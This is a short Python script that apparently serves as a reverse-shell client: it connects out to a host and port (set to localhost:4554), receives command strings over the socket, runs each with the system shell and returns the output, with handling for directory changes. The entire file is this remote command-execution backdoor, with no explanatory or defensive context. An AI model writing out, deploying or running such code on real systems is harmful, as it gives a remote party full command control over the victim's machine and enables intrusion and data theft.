import socket
import subprocess
import os
import sys


def receiver(s):
    """ Receive system commands and execute them """
    while True:
        cmd_bytes = s.recv(1024)
        cmd = cmd_bytes.decode('utf-8')
        if cmd.startswith('cd '):
            os.chdir(cmd[3:])
            s.send(b'$ ')
            continue
        if len(cmd) > 0:
            p = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            data = p.stdout + p.stderr
            s.send(data + b'$ ')


def connect(address):
    """ Establishing connection. Address should be tuple (host, port) """
    try:
        s = socket.socket()
        s.connect(address)
        print(f'Connection established.\nAddress: {address}')
    except socket.error as e:
        print('\nSome error occured\n')
        print(e)
        sys.exit()
    
    receiver(s)


if __name__ == '__main__':
    host = 'localhost'
    port = 4554
    connect((host, port))
